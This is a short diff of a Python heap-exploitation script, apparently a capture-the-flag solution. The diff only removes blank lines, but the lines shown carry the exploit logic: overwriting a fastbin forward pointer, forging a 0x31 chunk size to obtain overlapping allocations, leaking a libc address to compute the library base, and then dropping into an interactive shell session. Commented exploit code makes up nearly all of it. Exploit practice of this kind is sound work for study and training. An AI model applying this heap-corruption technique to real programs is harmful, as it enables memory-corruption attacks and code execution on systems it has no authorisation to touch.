@@ -65,19 +65,15 @@ def exploit(r):
     fill(0,len(payload),payload)
 
 
-
     #now we have corrupted the FD of the fastbin up to be alloced
     #but we must also change the size of the small chunk to 0x31 so that we can malloc it as a fastbin 
     payload =""
     payload += p64(0)*5 + p64(0x31)
     fill(3,len(payload),payload)
 
-
-
     #now the small bin is in the freelist with a fake size of 0x31 we can alloc twice to get it in use
     alloc(0x20)
     alloc(0x20) #given index[2] because the orginal index 2 got overwriten with the small chunk
-
 
 
     #now at 0xc0 we have both a fastbin and small bin
@@ -100,18 +96,6 @@ def exploit(r):
     #hex(0x7f1027f97b78(leaked address)-0x7f1027bd3000(libc loaded)) = '0x3c4b78L'
     libc_base = leak - 0x3c4b78
     log.info("Libc Base: %s" % hex(libc_base))
-
-
-
-
-
-
-
-
-
-
-
-
 
     r.interactive()
     return
